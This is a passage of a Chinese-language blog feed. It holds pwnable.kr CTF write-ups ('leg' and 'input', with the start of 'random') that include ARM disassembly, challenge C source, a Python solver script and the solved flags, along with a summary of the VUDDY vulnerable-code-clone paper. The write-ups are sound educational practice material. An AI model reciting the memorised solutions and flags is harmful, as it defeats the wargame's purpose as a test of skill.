lr</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disass key2</span><br><span class="line">Dump of assembler code for function key2:</span><br><span class="line">   0x00008cf0 &lt;+0&gt;:	push	&#123;r11&#125;		; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cf4 &lt;+4&gt;:	add	r11, sp, #0</span><br><span class="line">   0x00008cf8 &lt;+8&gt;:	push	&#123;r6&#125;		; (str r6, [sp, #-4]!)</span><br><span class="line">   0x00008cfc &lt;+12&gt;:	add	r6, pc, #1</span><br><span class="line">   0x00008d00 &lt;+16&gt;:	bx	r6</span><br><span class="line">   0x00008d04 &lt;+20&gt;:	mov	r3, pc</span><br><span class="line">   0x00008d06 &lt;+22&gt;:	adds	r3, #4</span><br><span class="line">   0x00008d08 &lt;+24&gt;:	push	&#123;r3&#125;</span><br><span class="line">   0x00008d0a &lt;+26&gt;:	pop	&#123;pc&#125;</span><br><span class="line">   0x00008d0c &lt;+28&gt;:	pop	&#123;r6&#125;		; (ldr r6, [sp], #4)</span><br><span class="line">   0x00008d10 &lt;+32&gt;:	mov	r0, r3</span><br><span class="line">   0x00008d14 &lt;+36&gt;:	sub	sp, r11, #0</span><br><span class="line">   0x00008d18 &lt;+40&gt;:	pop	&#123;r11&#125;		; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d1c &lt;+44&gt;:	bx	lr</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disass key3</span><br><span class="line">Dump of assembler code for function key3:</span><br><span class="line">   0x00008d20 &lt;+0&gt;:	push	&#123;r11&#125;		; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008d24 &lt;+4&gt;:	add	r11, sp, #0</span><br><span class="line">   0x00008d28 &lt;+8&gt;:	mov	r3, lr</span><br><span class="line">   0x00008d2c &lt;+12&gt;:	mov	r0, r3</span><br><span class="line">   0x00008d30 &lt;+16&gt;:	sub	sp, r11, #0</span><br><span class="line">   0x00008d34 &lt;+20&gt;:	pop	&#123;r11&#125;		; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d38 &lt;+24&gt;:	bx	lr</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>c与asm混合编程，只要我们输入的<code>key</code>的值等于<code>key1()+key2()+key3()</code>的值即可。</p><h3><span id="pkey1">key1()</span><a href="#pkey1" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x00008cd4 &lt;+0&gt;:	push	&#123;r11&#125;		; (str r11, [sp, #-4]!)</span><br><span class="line">0x00008cd8 &lt;+4&gt;:	add	r11, sp, #0</span><br><span class="line">0x00008cdc &lt;+8&gt;:	mov	r3, pc</span><br><span class="line">0x00008ce0 &lt;+12&gt;:	mov	r0, r3</span><br><span class="line">0x00008ce4 &lt;+16&gt;:	sub	sp, r11, #0</span><br><span class="line">0x00008ce8 &lt;+20&gt;:	pop	&#123;r11&#125;		; (ldr r11, [sp], #4)</span><br><span class="line">0x00008cec &lt;+24&gt;:	bx	lr</span><br></pre></td></tr></table></figure><p>返回值为<code>r0</code>,<code>r0</code>保存的是<code>0x00008cdc</code>处时的<code>pc</code>值，由于流水线处理，pc为进接的第二条指令的地址，<code>pc=0x00008ce4</code>，<code>key1()=0x00008ce4</code></p><h3><span id="pkey2">key2()</span><a href="#pkey2" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x00008cf0 &lt;+0&gt;:	push	&#123;r11&#125;		; (str r11, [sp, #-4]!)</span><br><span class="line">0x00008cf4 &lt;+4&gt;:	add	r11, sp, #0</span><br><span class="line">0x00008cf8 &lt;+8&gt;:	push	&#123;r6&#125;		; (str r6, [sp, #-4]!)</span><br><span class="line">0x00008cfc &lt;+12&gt;:	add	r6, pc, #1</span><br><span class="line">0x00008d00 &lt;+16&gt;:	bx	r6</span><br><span class="line">0x00008d04 &lt;+20&gt;:	mov	r3, pc</span><br><span class="line">0x00008d06 &lt;+22&gt;:	adds	r3, #4</span><br><span class="line">0x00008d08 &lt;+24&gt;:	push	&#123;r3&#125;</span><br><span class="line">0x00008d0a &lt;+26&gt;:	pop	&#123;pc&#125;</span><br><span class="line">0x00008d0c &lt;+28&gt;:	pop	&#123;r6&#125;		; (ldr r6, [sp], #4)</span><br><span class="line">0x00008d10 &lt;+32&gt;:	mov	r0, r3</span><br><span class="line">0x00008d14 &lt;+36&gt;:	sub	sp, r11, #0</span><br><span class="line">0x00008d18 &lt;+40&gt;:	pop	&#123;r11&#125;		; (ldr r11, [sp], #4)</span><br><span class="line">0x00008d1c &lt;+44&gt;:	bx	lr</span><br></pre></td></tr></table></figure><p>同<code>key1()</code>,r0保存的是<code>r3+#4</code>，而r3是<code>0X00008d04</code>时的pc值，<code>pc=0x00008d08</code>,所以<code>key2()=0x00008d08+4=0x00008d0c</code></p><h3><span id="pkey3">key3()</span><a href="#pkey3" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x00008d20 &lt;+0&gt;:	push	&#123;r11&#125;		; (str r11, [sp, #-4]!)</span><br><span class="line">0x00008d24 &lt;+4&gt;:	add	r11, sp, #0</span><br><span class="line">0x00008d28 &lt;+8&gt;:	mov	r3, lr</span><br><span class="line">0x00008d2c &lt;+12&gt;:	mov	r0, r3</span><br><span class="line">0x00008d30 &lt;+16&gt;:	sub	sp, r11, #0</span><br><span class="line">0x00008d34 &lt;+20&gt;:	pop	&#123;r11&#125;		; (ldr r11, [sp], #4)</span><br><span class="line">0x00008d38 &lt;+24&gt;:	bx	lr</span><br></pre></td></tr></table></figure><p><code>r0</code>的值是<code>lr</code>的值，而<code>lr</code>是子函数返回位置的地址，在main函数中可以看到为<code>0x00008d80</code></p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><p>所以我们知道<code>key</code>应该等于<code>0x00008d80+0x00008d0c+0x00008ce4=108400</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F; $ .&#x2F;leg</span><br><span class="line">Daddy has very strong arm! : 108400</span><br><span class="line">Congratz!</span><br><span class="line">My daddy has a lot of ARMv5te muscle!</span><br></pre></td></tr></table></figure><p><code>flag</code>：<code>My daddy has a lot of ARMv5te muscle!</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— input</title>
    <url>/2e1b27bb.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mom? how can I pass my input to a computer program?</span><br><span class="line"></span><br><span class="line">ssh input2@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><p>题目要求我们使用ssh登录到服务器上查看<code>ssh input2@pwnable.kr -p2222</code>，密码是<code>guest</code>,有的时候可能有身份的校验，这个时候需要加上参数<code>-o StrictHostKeyChecking=no</code>进行登录</p><a id="more"></a><h2><span id="pinput-c">input.c</span><a href="#pinput-c" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;socket.h&gt;</span><br><span class="line">#include &lt;arpa&#x2F;inet.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[], char* envp[])&#123;</span><br><span class="line">	printf(&quot;Welcome to pwnable.kr\n&quot;);</span><br><span class="line">	printf(&quot;Let&#39;s see if you know how to give input to program\n&quot;);</span><br><span class="line">	printf(&quot;Just give me correct inputs then you will get the flag :)\n&quot;);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; argv</span><br><span class="line">	if(argc !&#x3D; 100) return 0;</span><br><span class="line">	if(strcmp(argv[&#39;A&#39;],&quot;\x00&quot;)) return 0;</span><br><span class="line">	if(strcmp(argv[&#39;B&#39;],&quot;\x20\x0a\x0d&quot;)) return 0;</span><br><span class="line">	printf(&quot;Stage 1 clear!\n&quot;);	</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; stdio</span><br><span class="line">	char buf[4];</span><br><span class="line">	read(0, buf, 4);</span><br><span class="line">	if(memcmp(buf, &quot;\x00\x0a\x00\xff&quot;, 4)) return 0;</span><br><span class="line">	read(2, buf, 4);</span><br><span class="line">        if(memcmp(buf, &quot;\x00\x0a\x02\xff&quot;, 4)) return 0;</span><br><span class="line">	printf(&quot;Stage 2 clear!\n&quot;);</span><br><span class="line">	</span><br><span class="line">	&#x2F;&#x2F; env</span><br><span class="line">	if(strcmp(&quot;\xca\xfe\xba\xbe&quot;, getenv(&quot;\xde\xad\xbe\xef&quot;))) return 0;</span><br><span class="line">	printf(&quot;Stage 3 clear!\n&quot;);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; file</span><br><span class="line">	FILE* fp &#x3D; fopen(&quot;\x0a&quot;, &quot;r&quot;);</span><br><span class="line">	if(!fp) return 0;</span><br><span class="line">	if( fread(buf, 4, 1, fp)!&#x3D;1 ) return 0;</span><br><span class="line">	if( memcmp(buf, &quot;\x00\x00\x00\x00&quot;, 4) ) return 0;</span><br><span class="line">	fclose(fp);</span><br><span class="line">	printf(&quot;Stage 4 clear!\n&quot;);	</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; network</span><br><span class="line">	int sd, cd;</span><br><span class="line">	struct sockaddr_in saddr, caddr;</span><br><span class="line">	sd &#x3D; socket(AF_INET, SOCK_STREAM, 0);</span><br><span class="line">	if(sd &#x3D;&#x3D; -1)&#123;</span><br><span class="line">		printf(&quot;socket error, tell admin\n&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	saddr.sin_family &#x3D; AF_INET;</span><br><span class="line">	saddr.sin_addr.s_addr &#x3D; INADDR_ANY;</span><br><span class="line">	saddr.sin_port &#x3D; htons( atoi(argv[&#39;C&#39;]) );</span><br><span class="line">	if(bind(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0)&#123;</span><br><span class="line">		printf(&quot;bind error, use another port\n&quot;);</span><br><span class="line">    		return 1;</span><br><span class="line">	&#125;</span><br><span class="line">	listen(sd, 1);</span><br><span class="line">	int c &#x3D; sizeof(struct sockaddr_in);</span><br><span class="line">	cd &#x3D; accept(sd, (struct sockaddr *)&amp;caddr, (socklen_t*)&amp;c);</span><br><span class="line">	if(cd &lt; 0)&#123;</span><br><span class="line">		printf(&quot;accept error, tell admin\n&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	if( recv(cd, buf, 4, 0) !&#x3D; 4 ) return 0;</span><br><span class="line">	if(memcmp(buf, &quot;\xde\xad\xbe\xef&quot;, 4)) return 0;</span><br><span class="line">	printf(&quot;Stage 5 clear!\n&quot;);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; here&#39;s your flag</span><br><span class="line">	system(&quot;&#x2F;bin&#x2F;cat flag&quot;);	</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><h3><span id="pstep-1">step 1:</span><a href="#pstep-1" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(argc !&#x3D; 100) return 0;</span><br><span class="line">if(strcmp(argv[&#39;A&#39;],&quot;\x00&quot;)) return 0;</span><br><span class="line">if(strcmp(argv[&#39;B&#39;],&quot;\x20\x0a\x0d&quot;)) return 0;</span><br><span class="line">printf(&quot;Stage 1 clear!\n&quot;);</span><br></pre></td></tr></table></figure><p>也就是说在执行时传入的参数时，需要有100个参数（包含<code>./input</code>），并且其中的<code>argv['A']</code>要等于<code>\x00</code>,<code>argv['B']</code>要等于<code>\x20\x0a\x0d</code>。</p><h3><span id="pstep-2">step 2:</span><a href="#pstep-2" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">   &#x2F;&#x2F; stdio</span><br><span class="line">char buf[4];</span><br><span class="line">read(0, buf, 4);</span><br><span class="line">if(memcmp(buf, &quot;\x00\x0a\x00\xff&quot;, 4)) return 0;</span><br><span class="line">read(2, buf, 4);</span><br><span class="line">       if(memcmp(buf, &quot;\x00\x0a\x02\xff&quot;, 4)) return 0;</span><br><span class="line">printf(&quot;Stage 2 clear!\n&quot;);</span><br></pre></td></tr></table></figure><p>标准输入输出，从标准输入读取4字节<code>\x00\x0a\x00\xff</code>，从标准错误读取四字节<code>\x00\x0a\x02\xff</code></p><h3><span id="pstep-3">step 3:</span><a href="#pstep-3" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; env</span><br><span class="line">if(strcmp(&quot;\xca\xfe\xba\xbe&quot;, getenv(&quot;\xde\xad\xbe\xef&quot;))) return 0;</span><br><span class="line">printf(&quot;Stage 3 clear!\n&quot;);</span><br></pre></td></tr></table></figure><p>设置环境变量<code>\xde\xad\xbe\xef</code>的值为<code>\xca\xfe\xba\xbe</code></p><h3><span id="pstep-4">step 4:</span><a href="#pstep-4" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">   FILE* fp &#x3D; fopen(&quot;\x0a&quot;, &quot;r&quot;);</span><br><span class="line">if(!fp) return 0;</span><br><span class="line">if( fread(buf, 4, 1, fp)!&#x3D;1 ) return 0;</span><br><span class="line">if( memcmp(buf, &quot;\x00\x00\x00\x00&quot;, 4) ) return 0;</span><br><span class="line">fclose(fp);</span><br><span class="line">printf(&quot;Stage 4 clear!\n&quot;);</span><br></pre></td></tr></table></figure><p>文件操作，从<code>\x0a</code>文件读取四字节，看是否为<code>\x00\x00\x00\x00</code></p><h3><span id="pstep-5">step 5:</span><a href="#pstep-5" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int sd, cd;</span><br><span class="line">	struct sockaddr_in saddr, caddr;</span><br><span class="line">	sd &#x3D; socket(AF_INET, SOCK_STREAM, 0);</span><br><span class="line">	if(sd &#x3D;&#x3D; -1)&#123;</span><br><span class="line">		printf(&quot;socket error, tell admin\n&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	saddr.sin_family &#x3D; AF_INET;</span><br><span class="line">	saddr.sin_addr.s_addr &#x3D; INADDR_ANY;</span><br><span class="line">	saddr.sin_port &#x3D; htons( atoi(argv[&#39;C&#39;]) );</span><br><span class="line">	if(bind(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0)&#123;</span><br><span class="line">		printf(&quot;bind error, use another port\n&quot;);</span><br><span class="line">    		return 1;</span><br><span class="line">	&#125;</span><br><span class="line">	listen(sd, 1);</span><br><span class="line">	int c &#x3D; sizeof(struct sockaddr_in);</span><br><span class="line">	cd &#x3D; accept(sd, (struct sockaddr *)&amp;caddr, (socklen_t*)&amp;c);</span><br><span class="line">	if(cd &lt; 0)&#123;</span><br><span class="line">		printf(&quot;accept error, tell admin\n&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	if( recv(cd, buf, 4, 0) !&#x3D; 4 ) return 0;</span><br><span class="line">	if(memcmp(buf, &quot;\xde\xad\xbe\xef&quot;, 4)) return 0;</span><br><span class="line">	printf(&quot;Stage 5 clear!\n&quot;);</span><br></pre></td></tr></table></figure><p>socket 编程，打开端口<code>argv['C']</code>，监听直到接收到数值，判断是否为<code>\xde\xad\xbe\xef</code></p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># input.py</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">stdinr, stdinw = os.pipe()</span><br><span class="line">stderrr, stderrw = os.pipe()</span><br><span class="line"></span><br><span class="line">args = list(<span class="string">"A"</span>*<span class="number">99</span>)</span><br><span class="line">args[ord(<span class="string">'A'</span>) - <span class="number">1</span>] = <span class="string">""</span></span><br><span class="line">args[ord(<span class="string">'B'</span>) - <span class="number">1</span>] = <span class="string">"\x20\x0a\x0d"</span></span><br><span class="line">args[ord(<span class="string">"C"</span>) - <span class="number">1</span>] = <span class="string">"8888"</span></span><br><span class="line"></span><br><span class="line">os.write(stdinw, <span class="string">"\x00\x0a\x00\xff"</span>)</span><br><span class="line">os.write(stderrw, <span class="string">"\x00\x0a\x02\xff"</span>)</span><br><span class="line"></span><br><span class="line">environ = &#123;<span class="string">"\xde\xad\xbe\xef"</span> : <span class="string">"\xca\xfe\xba\xbe"</span>&#125;</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">"\x0a"</span> , <span class="string">"wb"</span>)</span><br><span class="line">f.write(<span class="string">"\x00"</span>*<span class="number">4</span>)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">pro = subprocess.Popen([<span class="string">"/home/input2/input"</span>]+args, stdin=stdinr,stderr=stderrr,env=environ)</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line">s.connect((<span class="string">"127.0.0.1"</span>, <span class="number">8888</span>))</span><br><span class="line">s.send(<span class="string">"\xde\xad\xbe\xef"</span>)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><p>但是并没有这么简单，由于文件夹读写权限问题，我们首先需要将脚本scp到<code>/tmp</code>目录下，然后新建一个自己的目录，接着分别建立<code>input.py</code>和<code>flag</code>文件的软链接到自己的目录下，然后执行脚本。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">input2@ubuntu:/tmp$ mkdir ycd</span><br><span class="line">input2@ubuntu:/tmp$ cd ycd</span><br><span class="line">input2@ubuntu:/tmp/ycd$ mv ../input.py .</span><br><span class="line">input2@ubuntu:/tmp/ycd$ ls</span><br><span class="line">input.py</span><br><span class="line">input2@ubuntu:/tmp/ycd$ ln -s /home/input2/flag flag</span><br><span class="line">input2@ubuntu:/tmp/ycd$ python input.py</span><br><span class="line">Welcome to pwnable.kr</span><br><span class="line">Let's see if you know how to give input to program</span><br><span class="line">Just give me correct inputs then you will get the flag :)</span><br><span class="line">Stage 1 clear!</span><br><span class="line">Stage 2 clear!</span><br><span class="line">Stage 3 clear!</span><br><span class="line">Stage 4 clear!</span><br><span class="line">Stage 5 clear!</span><br><span class="line">Mommy! I learned how to pass various input in Linux :)</span><br></pre></td></tr></table></figure><p><code>flag</code>:<code>Mommy! I learned how to pass various input in Linux :)</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.04.04 哀悼为抗击疫情斗争牺牲的烈士和逝世同胞</title>
    <url>/55e3f1f2.html</url>
    <content><![CDATA[<p>哀悼！</p><a id="more"></a><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133437.jpg" alt="image-20200404022013282"></p>]]></content>
      <categories>
        <category>life</category>
      </categories>
      <tags>
        <tag>life</tag>
      </tags>
  </entry>
  <entry>
    <title>VUDDY A Scalable Approach for Vulnerable Code Clone Discovery(S&amp;P 2017)</title>
    <url>/21fd9cb8.html</url>
    <content><![CDATA[<h2><span id="pabstract">Abstract</span><a href="#pabstract" class="header-anchor">#</a></h2><p>随着开源世界的扩大，代码克隆的情况也越来越普遍，与此同时，由于代码克隆产生的1day漏洞也越来越多，因此自动化的克隆代码漏洞检测成为一大需求。</p><p>本文提出了一种大规模复用漏洞代码检测的方法——VUDDY，能在大规模的代码中精确有效的发现漏洞。</p><p>优势：</p><ul><li>十亿行量级的代码检测只需要14小时17分钟</li><li>可进行传统的完全检测和部分正规化后的检测</li><li>规模和准确率完胜其余的相关研究</li><li>有一定的检测0 day漏洞的能力</li></ul><a id="more"></a><h2><span id="pintroduction">Introduction</span><a href="#pintroduction" class="header-anchor">#</a></h2><p>代码克隆缺点：</p><ul><li>raise maintenance costs</li><li>reduce quality</li><li>produce potential legal conflicts</li><li>propagate software vulnerabilities</li><li>…</li></ul><p>最大的问题在于由于代码克隆，一个已经给出的补丁，并不会马上被用于修复使用克隆代码的项目，给黑客的利用提供了可乘之机。</p><p>其余研究的短板：</p><ul><li>CCFinder等：处理太复杂</li><li>ReDeBug：目的是为了大规模、快和准确，但实际效果并不行</li><li>SourcererCC：容易找到已修补的克隆代码</li></ul><p>VUDDY（VUlnerrable coDe clone DiscoverY）…（这名字取的真刻意）：</p><ul><li>函数粒度识别</li><li>正则化使得其漏洞模式（也就是漏洞函数）存在一定通用性</li><li>二级索引：长度+hash，使得其更快</li><li>效果：1764个patch中找到5664个漏洞函数，从25253个C/C++项目中找到了133812个漏洞函数（1 day），比ReDeBug快2倍，having no false positive with Android firmware. Meanwhile, ReDeBug had 17.6 % false positives.</li></ul><p>本文贡献：</p><ul><li>工具VUDDY</li><li>漏洞模式抽象</li><li>自动化漏洞信息获取</li><li>开放服务， <a href="https://iotcube.net/%EF%BC%8C%E6%88%91%E8%AF%95%E7%94%A8%E8%BF%87%EF%BC%8C%E5%81%9A%E7%9A%84%E8%BF%98%E6%98%AF%E5%BE%88%E4%B8%8D%E9%94%99%E7%9A%84%EF%BC%8C%E4%BD%86%E6%98%AF%E8%A6%81%E8%87%AA%E5%B7%B1%E7%94%A8VUDDY%E5%BC%80%E6%BA%90%E7%9A%84%E4%BB%A3%E7%A0%81%E5%A4%84%E7%90%86%E3%80%82%E7%84%B6%E5%90%8E%E6%8F%90%E4%BA%A4hash%E6%96%87%E4%BB%B6%E6%A3%80%E6%B5%8B%E3%80%82" target="_blank" rel="noopener">https://iotcube.net/，我试用过，做的还是很不错的，但是要自己用VUDDY开源的代码处理。然后提交hash文件检测。</a></li></ul><h2><span id="ptaxonomy-and-related-work">Taxonomy and related work</span><a href="#ptaxonomy-and-related-work" class="header-anchor">#</a></h2><h3><span id="ptaxonomy">Taxonomy</span><a href="#ptaxonomy" class="header-anchor">#</a></h3><p>克隆代码分类：</p><ul><li>Type1：完全克隆，无修改</li><li>Type2：重命名克隆，例如类型名，函数名，变量名等</li><li>Type3：简单的增删等</li><li>Type4：语义克隆</li></ul><p>其中VUDDY支持类型1和类型2的检测</p><p>代码粒度分类：</p><ul><li>token</li><li>line</li><li>function</li><li>file</li></ul><h3><span id="prelated-work">related work</span><a href="#prelated-work" class="header-anchor">#</a></h3><p>根据粒度来讲</p><ul><li>token-level：CCFinder（我用过不好用）、CP-Miner</li><li>line-level：Redebug（好用）</li><li>function-leve：SourcererCC（好用）</li><li>file-level：DECKARD、FCFinder</li><li>Hybrid granularity：VulPecker</li></ul><h3><span id="pproblem-and-goal-statement">Problem and goal statement</span><a href="#pproblem-and-goal-statement" class="header-anchor">#</a></h3><h3><span id="pproblem-formulation">Problem formulation</span><a href="#pproblem-formulation" class="header-anchor">#</a></h3><p>克隆检测定义：从一个代码项目中，判断函数是否存在</p><p>完全克隆定义：$C(f)=1$</p><p>抽象克隆定义：</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133855.jpg" alt="image-20200403230003462"></p><h3><span id="pgoals">Goals</span><a href="#pgoals" class="header-anchor">#</a></h3><p>设计一个能检测1、2类克隆的算法</p><h2><span id="pthe-proprosed-method-vuddy">The proprosed method：VUDDY</span><a href="#pthe-proprosed-method-vuddy" class="header-anchor">#</a></h2><p>VUDDY的框架如下图所示：</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133907.jpg" alt="image-20200403230159765"></p><p>分为两个部分：预处理部分和克隆检测部分</p><p>预处理部分：</p><ul><li>函数提取</li><li>抽象和正规化</li><li>漏洞指纹生成</li></ul><p>克隆检测部分：</p><ul><li>key查询</li><li>hash查询</li></ul><h3><span id="ppreprocess">Preprocess</span><a href="#ppreprocess" class="header-anchor">#</a></h3><p><strong>Function retrieval</strong>：使用ANTLR实现了一个提取C程序中的函数的jar包，并提取参数、类型、局部变量信息</p><p><strong>Abstraction and normalization</strong>：对参数、类型、局部变量进行正规化，（统一用某个字符串代替），可以分为不抽象、参数抽象、局部变量抽象、数据类型抽象、函数调用抽象，见下图</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133913.jpg" alt="image-20200403230718496"></p><p><strong>Fingerprint generation</strong>：计算函数体以长度和hash值，示例见下</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133920.jpg" alt="image-20200403230804731"></p><h3><span id="pclone-detector">Clone detector</span><a href="#pclone-detector" class="header-anchor">#</a></h3><p><strong>key lookup</strong>: 长度过滤</p><p><strong>hash lookup</strong>：hash比对</p><p>由于用了两层索引，速度很快，最差是O(n)</p><h2><span id="papplication-vulnerability-detection">Application：Vulnerability detection</span><a href="#papplication-vulnerability-detection" class="header-anchor">#</a></h2><h3><span id="pestablishing-a-vulnerability-database">Establishing a vulnerability database</span><a href="#pestablishing-a-vulnerability-database" class="header-anchor">#</a></h3><ul><li>Git clone</li><li>git log --grep=‘CVE-20’</li><li>Git show commit</li><li>Filter irrelevant commits.</li><li>git show the old file ID</li></ul><p>通过这种方法找到了9779个漏洞不行，对CVE去重后的1764个补丁中找到了5664个扣动函数</p><h3><span id="pvulnerability-detection">Vulnerability detection</span><a href="#pvulnerability-detection" class="header-anchor">#</a></h3><p>和clone detector没啥差别，但是是集合和集合间的交叉搜索</p><h2><span id="pimplememtation">Implememtation</span><a href="#pimplememtation" class="header-anchor">#</a></h2><ul><li>ANTLR实现函数提取部分</li><li>hash选用md5</li><li>字典选用python的<code>dict[Length]=[hash1,hash2..]</code></li></ul><h2><span id="pevalutaion">Evalutaion</span><a href="#pevalutaion" class="header-anchor">#</a></h2><p><strong>实验环境：</strong></p><ul><li>Ubuntu16.04</li><li>2.40 GHz Intel Zeon</li><li>32GB RAM</li><li>6TB HDD</li></ul><p>*<em>数据集：</em> 从2016.1.1到20167.28 github上的 25253个C/C++ git项目</p><p><strong>比较的配置：</strong></p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133929.jpg" alt="image-20200403233225311"></p><p><strong>大数据量比较：</strong><br><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133940.jpg" alt="image-20200513212730805"></p><p><strong>准确率比较：</strong><br><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133945.jpg" alt="image-20200513212747666"></p><p><strong>完全克隆检测和抽象比较:</strong> 166个 VS 206个，后者比前者多了24%的结果</p><h2><span id="pcompare-with-redebug">Compare with redebug</span><a href="#pcompare-with-redebug" class="header-anchor">#</a></h2><ul><li>twice faster</li><li>less false positive</li><li>VUDDY可以检测第二类但是ReDeBug不行</li></ul><p>具体的分析就不说了</p><h2><span id="pdiscussion">Discussion</span><a href="#pdiscussion" class="header-anchor">#</a></h2><p>讨论了函数粒度的优势，包括时间复杂度、内存使用以及精度</p><h2><span id="pge-ren-kan-fa">个人看法</span><a href="#pge-ren-kan-fa" class="header-anchor">#</a></h2><ul><li>与redebug相比，把粒度加大到函数，错误率与redebug相比会降低很多</li><li>当redebug的窗口设置为函数体大小时，就等于不进行正规化的VUDDY</li><li>从使用效果来看，其实还是有部分误报情况的，准确度和具体的项目有很大关系</li></ul>]]></content>
      <categories>
        <category>papers</category>
        <category>security</category>
        <category>automatic_analyse</category>
      </categories>
      <tags>
        <tag>paper</tag>
        <tag>security</tag>
        <tag>automatic analyse</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— random</title>
    <url>/a4584c42.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Daddy, teach me how to use random value in programming!</span><br><span class="line"></span><br><span class="line">ssh random@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><a id="more"></a><h2><span id="prandom-c">random.c</span><a href="#prandom-c" class="header-anchor">#</a></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">random</span>;</span><br><span class="line">	<span class="built_in">random</span> = rand();	<span class="comment">// random value!</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> key=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;key);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>( (key ^ <span 